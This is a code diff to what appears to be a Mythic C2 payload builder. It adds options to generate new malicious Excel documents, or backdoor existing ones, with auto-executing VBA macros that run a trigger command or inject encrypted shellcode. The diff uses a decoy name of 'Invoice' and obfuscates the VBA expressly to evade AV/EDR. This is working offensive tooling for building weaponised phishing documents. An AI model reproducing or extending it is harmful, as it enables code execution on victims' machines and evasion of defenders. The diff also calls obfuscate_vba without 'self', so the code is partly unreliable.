@@ -74,6 +74,14 @@ except ImportError:
     get_remote_cert_details = _plugin_loader.get_function("get_remote_cert_details")
     sign_with_provided_cert = _plugin_loader.get_function("sign_with_provided_cert")
 
+try:
+    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import generate_excel_payload, backdoor_existing_excel
+except ImportError:
+    generate_excel_payload = _plugin_loader.get_function("generate_excel_payload")
+    backdoor_existing_excel = _plugin_loader.get_function("backdoor_existing_excel")
+
+
+
 # ==================== End Plugin System ====================
 
 from mythic_container.PayloadBuilder import *
@@ -650,6 +658,84 @@ generated if none have been entered.""",
             ]
         ),
 
+        # MalDocs - Excel Backdooring
+        BuildParameter(
+            name="7.0 Create MalDoc",
+            parameter_type=BuildParameterType.Boolean,
+            description="Create a malicious Excel document (XLSM) with embedded VBA payload",
+            default_value=False,
+            required=False,
+        ),
+
+        BuildParameter(
+            name="7.1 MalDoc Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Create new Excel document or backdoor an existing one",
+            choices=["Create New", "Backdoor Existing"],
+            default_value="Create New",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
+        BuildParameter(
+            name="7.2 Excel Source File",
+            parameter_type=BuildParameterType.File,
+            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="7.1 MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing")
+            ]
+        ),
+
+        BuildParameter(
+            name="7.3 VBA Execution Trigger",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="VBA macro execution trigger method",
+            choices=["AutoOpen", "OnClose", "OnSave"],
+            default_value="AutoOpen",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
+        BuildParameter(
+            name="7.4 Excel Document Name",
+            parameter_type=BuildParameterType.String,
+            description="Name/title for the Excel document",
+            default_value="Invoice",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
+        BuildParameter(
+            name="7.5 Obfuscate VBA",
+            parameter_type=BuildParameterType.Boolean,
+            description="Obfuscate VBA code to evade AV/EDR detection",
+            default_value=True,
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
+        BuildParameter(
+            name="7.6 MalDoc Injection Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
+            choices=["Command Execution", "Shellcode Injection"],
+            default_value="Command Execution",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="7.0 Create MalDoc", operand=HideConditionOperand.EQ, value=False)
+            ]
+        ),
+
     ]
 
     build_steps = [
@@ -686,9 +772,31 @@ generated if none have been entered.""",
         BuildStep(step_name = "Creating Decoy",
                   step_description= "Creating a placeholder decoy file"),
 
+        BuildStep(step_name = "Creating MalDoc",
+                  step_description = "Creating or backdooring Excel document with VBA payload"),
+
         BuildStep(step_name = "Containerising",
                   step_description = "Adding payload into chosen container"),
     ]
+
+    async def obfuscate_vba(self, vba_code):
+        """Obfuscate VBA code locally or via plugin"""
+        try:
+            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
+            plugin = PayloadMalDocsPlugin()
+            return plugin.obfuscate_vba(vba_code)
+        except ImportError:
+            # Fallback: simple obfuscation without plugin
+            import re
+            obfuscated = vba_code
+            replacements = {
+                'Shell': 'Sh' + chr(101) + 'll',
+                'CreateObject': 'Cr' + chr(101) + 'ateObject',
+                'WScript': 'WSc' + chr(114) + 'ipt',
+            }
+            for original, replacement in replacements.items():
+                obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
+            return obfuscated
 
     async def backdoor_msi_payload(self, agent_build_path):
         """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory
@@ -879,20 +987,6 @@ generated if none have been entered.""",
 
         return None
 
-    def create_triggers(self):
-        """Creates a trigger to execute the payload
-
-        Raises:
-            NotImplementedError: Function not implemented yet.
-
-        TODO:
-            - LNK Trigger
-            - LOLBIN Trigger
-            - MSI/MST Trigger
-            - ClickOnce Trigger
-        """
-        raise NotImplementedError
-
     async def build(self) -> BuildResponse:
         response = BuildResponse(status = BuildStatus.Error)
         output = ""
@@ -934,6 +1028,18 @@ generated if none have been entered.""",
             os.mkdir(path=Path(agent_build_path) / "payload")
 
             environment = Environment(loader=FileSystemLoader(templates_path))
+
+            # Validate wrapped_payload before writing
+            if self.wrapped_payload is None:
+                response.status = BuildStatus.Error
+                response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Gathering Files",
+                    StepStdout="No wrapped payload provided (wrapped_payload is None).",
+                    StepSuccess=False
+                ))
+                return response
 
             with open(mythic_shellcode_path, "wb") as file:
                 file.write(self.wrapped_payload)
@@ -1693,7 +1799,6 @@ generated if none have been entered.""",
                     response.build_stderr = f"Code signing failed: {str(e)}"
                     return response
 
-
             ######################### Creating Decoy Section #########################
             decoy_dir = Path(agent_build_path) / "decoys"
             decoy_file_uuid = self.get_parameter("0.10 Decoy File")
@@ -1742,6 +1847,137 @@ generated if none have been entered.""",
                         StepSuccess=True
                     ))
             ######################### End of Decoy Section #########################
+            ######################### MalDoc Creation Section #########################
+            if self.get_parameter("7.0 Create MalDoc"):
+                payload_dir = Path(agent_build_path) / "payload"
+                maldoc_type = self.get_parameter("7.1 MalDoc Type")
+                vba_trigger = self.get_parameter("7.3 VBA Execution Trigger")
+                doc_name = self.get_parameter("7.4 Excel Document Name")
+                obfuscate = self.get_parameter("7.5 Obfuscate VBA")
+                injection_type = self.get_parameter("7.6 MalDoc Injection Type")
+
+                try:
+                    # Generate VBA payload code based on injection type
+                    if injection_type == "Command Execution":
+                        # Use WScript.Shell to execute trigger binary and command
+                        trigger_binary = self.get_parameter("0.8 Trigger Binary")
+                        trigger_command = self.get_parameter("0.9 Trigger Command")
+                        
+                        # Import the plugin function to generate command execution VBA
+                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
+                        plugin = PayloadMalDocsPlugin()
+                        vba_code = plugin.generate_command_execution_vba(
+                            trigger_binary=trigger_binary,
+                            trigger_command=trigger_command,
+                            trigger_type=vba_trigger
+                        )
+
+                    else:  # Shellcode Injection
+                        # Convert shellcode to VBA format using shellcrypt
+                        # First, generate the VBA-formatted shellcode
+                        cmd = [
+                            "python",
+                            shellcrypt_path,
+                            "-i", mythic_shellcode_path,
+                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                            "-f", "vba",
+                            "-a", "shellcode"
+                        ]
+
+                        if self.get_parameter("2.2 Encryption Key") != "NONE":
+                            cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
+
+                        if self.get_parameter("2.0 Compression Type") != "NONE":
+                            cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
+
+                        # Run shellcrypt to get VBA shellcode
+                        shellcode_vba = subprocess.check_output(cmd, text=True)
+                        output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
+
+                        # Generate VBA that injects the shellcode
+                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
+                        plugin = PayloadMalDocsPlugin()
+                        vba_code = plugin.generate_shellcode_injection_vba(
+                            vba_shellcode=shellcode_vba,
+                            trigger_type=vba_trigger
+                        )
+                    
+                    if obfuscate:
+                        vba_code = obfuscate_vba(vba_code)
+
+                    if maldoc_type == "Create New":
+                        # Create a new Excel document
+                        excel_output = payload_dir / f"{doc_name}.xlsm"
+                        excel_path = generate_excel_payload(
+                            payload_path=str(payload_dir),
+                            vba_payload=vba_code,
+                            output_path=excel_output
+                        )
+                        
+                        success_msg = f"Created malicious Excel document: {excel_path.name}"
+
+                    else:  # Backdoor Existing
+                        # Get the uploaded Excel file
+                        excel_uuid = self.get_parameter("7.2 Excel Source File")
+                        if not excel_uuid:
+                            raise ValueError("No Excel file provided for backdooring")
+
+                        file_resp = await SendMythicRPCFileGetContent(
+                            MythicRPCFileGetContentMessage(AgentFileId=excel_uuid)
+                        )
+
+                        if not file_resp.Success:
+                            raise ValueError("Failed to retrieve Excel file")
+
+                        # Get original filename
+                        file_name_resp = await SendMythicRPCFileSearch(
+                            MythicRPCFileSearchMessage(AgentFileID=excel_uuid)
+                        )
+                        
+                        original_filename = "document.xlsm"
+                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
+                            original_filename = file_name_resp.Files[0].Filename
+
+                        # Save the uploaded file temporarily
+                        temp_excel = Path(tempfile.gettempdir()) / f"source_{excel_uuid}.xlsx"
+                        temp_excel.write_bytes(file_resp.Content)
+
+                        # Backdoor the Excel file
+                        output_name = f"{Path(original_filename).stem}_backdoored.xlsm"
+                        excel_output = payload_dir / output_name
+                        
+                        excel_path = backdoor_existing_excel(
+                            source_excel=str(temp_excel),
+                            vba_payload=vba_code,
+                            output_path=excel_output
+                        )
+
+                        # Cleanup temp file
+                        temp_excel.unlink(missing_ok=True)
+
+                        success_msg = f"Backdoored Excel document: {excel_path.name}"
+
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Creating MalDoc",
+                            StepStdout=success_msg,
+                            StepSuccess=True
+                        ))
+
+                except Exception as e:
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Creating MalDoc",
+                            StepStdout=f"Failed to create/backdoor Excel document: {str(e)}",
+                            StepSuccess=False
+                        ))
+                    response.status = BuildStatus.Error
+                    response.build_stderr = f"MalDoc creation failed: {str(e)}"
+                    return response
+
+            ######################### End of MalDoc Section #########################
             ######################### Trigger Generation Section #########################
             if self.get_parameter("0.0 Main Payload Type") == "Loader":
 
